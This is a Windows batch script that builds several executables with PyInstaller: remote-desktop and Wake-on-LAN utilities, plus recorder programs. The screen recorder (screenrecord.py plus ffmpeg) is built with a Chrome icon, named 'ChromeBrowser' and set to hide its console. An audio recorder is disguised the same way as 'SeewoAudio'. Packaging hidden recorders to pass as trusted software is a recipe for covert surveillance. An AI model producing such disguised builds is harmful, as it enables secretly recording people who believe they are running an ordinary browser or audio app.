@echo off
rmdir /s /q build
rmdir /s /q out
rmdir /s /q rdp
del /s /q *.spec

mkdir out
clang quickset_safety.c -o out\quickset_safety.exe
clang quickset.c -o out\quickset.exe

pyinstaller -i ".\icon\icon_chrome.ico" --distpath out --add-binary ".\bin\ffmpeg.exe;." --name "ChromeBrowser" --hide-console hide-early --onefile screenrecord.py
python rdp_generate.py
pyinstaller -i ".\icon\icon_rdp.ico" --distpath out --onefile rdp.py
pyinstaller -i ".\icon\icon_wol.ico" --distpath out --add-binary ".\mac.csv;." --name "WakeOnLan" --onefile wol_mac.py
pyinstaller -i ".\icon\icon_wol.ico" --distpath out --add-binary ".\mac_server.csv;." --name "WakeOnLan Server" --onefile wol_server.py
pyinstaller -i ".\icon\icon_audio.ico" --distpath out --add-binary ".\bin\ffmpeg.exe;." --name "SeewoAudio" --hide-console hide-early --onefile seewoaudio.py